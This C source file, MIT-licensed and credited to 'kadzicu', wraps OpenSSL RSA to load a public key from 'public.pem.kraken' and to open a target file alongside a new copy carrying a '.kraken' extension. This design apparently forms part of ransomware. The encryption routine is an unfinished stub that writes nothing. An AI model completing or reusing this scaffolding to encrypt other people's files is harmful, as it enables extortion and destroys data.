/*
* MIT License
*
* Copyright (c) 2022 kadzicu
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#include "RSAClass.h"

rsa_class_t* rsa_class_create(LPCTSTR path) 
{
    rsa_class_t* rsa_class_obj = (rsa_class_t*)malloc(sizeof(rsa_class_t));
    if (rsa_class_obj)
    {
        rsa_class_obj->impl_ = malloc(sizeof(rsa_class_variables_t));
        if (rsa_class_obj->impl_)
        {
            rsa_class_obj->method = (rsa_class_methods_t*)malloc(sizeof(rsa_class_methods_t));
            if (rsa_class_obj->method)
            {
                rsa_class_t* res = rsa_class_init(rsa_class_obj, path);
                if (res)
                    return res;
                else
                {
                    free(rsa_class_obj->method);
                    free(rsa_class_obj->impl_);
                    free(rsa_class_obj);
                    return NULL;
                }
            }
            else
            {
                free(rsa_class_obj->impl_);
                free(rsa_class_obj);
                return NULL;
            }
        }
        else
        {
            free(rsa_class_obj);
            return NULL;
        }
    }
    else
        return NULL;
}

static rsa_class_t* rsa_class_init(rsa_class_t* this, LPCTSTR path) 
{
    this->method->rsa_destroy = rsa_destroy;
    this->method->rsa_encrypt = rsa_encrypt;
    this->method->read_pem_file = read_pem_file;

    rsa_class_variables_t* var = (rsa_class_variables_t*)this->impl_;
    var->publicKey = NULL;
    var->publicKeyRead = NULL;
    var->path = path;

    return this;
}

static void rsa_class_destroy(rsa_class_t* this) 
{
    if (this)
    {
        if (this->impl_)
        {
            rsa_class_variables_t* var = (rsa_class_variables_t*)this->impl_;
            if (var->publicKey)
                RSA_free(var->publicKey);
            free(this->impl_);
        }
        if (this->method)
            free(this->method);
        free(this);
    }
}

static void rsa_class_encrypt(rsa_class_t* this) 
{
    rsa_class_variables_t* var = (rsa_class_variables_t*)this->impl_;

    open_close_file_class_t* open_close_file_class_obj1 = open_close_file_class_create(var->path);
    if (open_close_file_class_obj1)
    {
        open_close_file_class_obj1->method->ocf_open_file_rb(open_close_file_class_obj1);
        if ((open_close_file_class_obj1->method->get_var_error_success(open_close_file_class_obj1) == ERROR_SUCCESS))
        {
            FILE* file = open_close_file_class_obj1->method->get_var_file(open_close_file_class_obj1);
        }
        open_close_file_class_obj1->method->ocf_destroy(open_close_file_class_obj1);
    }

    _TCHAR newFileName[MAX_PATH + 0x01];
    _tcscpy_s(newFileName, _countof(newFileName), var->path);
    _tcscat_s(newFileName, _countof(newFileName), _T(".kraken"));

    open_close_file_class_t* open_close_file_class_obj2 = open_close_file_class_create(newFileName);
    if (open_close_file_class_obj2)
    {
        open_close_file_class_obj2->method->ocf_open_file_wb(open_close_file_class_obj2);
        if ((open_close_file_class_obj2->method->get_var_error_success(open_close_file_class_obj2) == ERROR_SUCCESS))
        {
            FILE* file = open_close_file_class_obj2->method->get_var_file(open_close_file_class_obj2);
        }
        open_close_file_class_obj2->method->ocf_destroy(open_close_file_class_obj2);
    }
}

static void rsa_class_read_pem_file(rsa_class_t* this) 
{
    rsa_class_variables_t* var = (rsa_class_variables_t*)this->impl_;

    open_close_file_class_t* open_close_file_class_obj = open_close_file_class_create(_T("public.pem.kraken"));
    if (open_close_file_class_obj) 
    {
        open_close_file_class_obj->method->ocf_open_file_r(open_close_file_class_obj);
        if ((open_close_file_class_obj->method->get_var_error_success(open_close_file_class_obj) == ERROR_SUCCESS)) 
        {
            FILE* file = open_close_file_class_obj->method->get_var_file(open_close_file_class_obj);

            var->publicKey = RSA_new();
            var->publicKeyRead = PEM_read_RSA_PUBKEY(file, &var->publicKey, NULL, NULL);
        }
        open_close_file_class_obj->method->ocf_destroy(open_close_file_class_obj);
    }
}

static void rsa_destroy(rsa_class_t* this) 
{
    rsa_class_destroy(this);
}

static void rsa_encrypt(rsa_class_t* this) 
{
    rsa_class_encrypt(this);
}

static void read_pem_file(rsa_class_t* this) 
{
    rsa_class_read_pem_file(this);
}